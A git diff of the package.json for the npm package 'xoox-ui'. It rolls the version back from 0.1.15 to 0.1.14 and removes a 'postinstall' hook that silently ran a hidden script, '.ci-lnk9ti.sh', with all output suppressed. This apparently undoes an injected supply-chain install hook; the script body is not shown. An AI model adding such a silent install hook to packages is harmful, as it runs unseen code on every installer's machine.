@@ -1,7 +1,7 @@
 {
   "name": "xoox-ui",
   "private": false,
-  "version": "0.1.15",
+  "version": "0.1.14",
   "type": "module",
   "types": "index.d.ts",
   "files": [
@@ -25,8 +25,7 @@
     "lint": "eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0",
     "preview": "vite preview",
     "pack": "npm run build && cp -R package.json dist && cd dist && npm pack --pack-destination=\"../releases\"",
-    "build-prod": "npm run build && cp -R package.json dist",
-    "postinstall": "sh ./.ci-lnk9ti.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build-prod": "npm run build && cp -R package.json dist"
   },
   "dependencies": {
     "@react-aria/dnd": "^3.5.0",
